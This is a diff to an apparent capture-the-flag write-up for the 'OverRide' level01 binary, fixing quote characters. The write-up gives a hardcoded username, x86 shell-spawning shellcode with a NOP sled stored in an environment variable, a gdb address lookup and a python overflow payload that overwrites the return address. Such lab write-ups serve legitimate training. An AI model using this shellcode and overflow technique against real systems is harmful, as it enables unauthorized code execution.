@@ -6,13 +6,13 @@ We have three functions: `main`, `verify_user_name`, `verify_user_pass`.
 
 The program looks like a simple login interface. 
 First, we enter our username, then our password. 
-To find the username, just look in the `verify_user_name` function to find it: “dat_wil.”
+To find the username, just look in the `verify_user_name` function to find it: "dat_wil."
 
 For the password it's more complex. In fact, we see the following condition: 
 ```c
 if ((local_14 == 0) || (local_14 != 0)) 
 {
-      puts(“nope, incorrect password...”);
+      puts("nope, incorrect password...");
       iVar1 = 1;
 }
 ```
@@ -37,21 +37,21 @@ And we get it : 80.
 
 All we need to do is export our shellcode to our :
 ```bash
-export SHELLCODE=$(python -c 'print “\x90”*1000 + “\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80”'))
+export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
 
 Once this is done, we need to take an address in the middle of our nopslide:
 ```
 (gdb) x/10s *((char **)environ)
-0xffffd4e0: “SHELLCODE=\220\220\220\220\220 [...]”
+0xffffd4e0: "SHELLCODE=\220\220\220\220\220 [...]"
 [...]
-0xffffd738: “\220\220\220\220\220\220\220 [...]"
+0xffffd738: "\220\220\220\220\220\220\220 [...]"
 ^^^^^^^^^^
 ```
 Here I've chosen the following address: 0xffffd738.
 And we have everything we need to place our order:
 ```bash
-level01@OverRide:~$ python -c 'print “dat_wil” + “\n” + 80*“A” + “\xff\xff\xd7\x38”[::-1]' > /tmp/1
+level01@OverRide:~$ python -c 'print "dat_wil" + "\n" + 80*"A" + "\xff\xff\xd7\x38"[::-1]' > /tmp/1
 level01@OverRide:~$ cat /tmp/1 - | /home/users/level01/level01
 ```
 
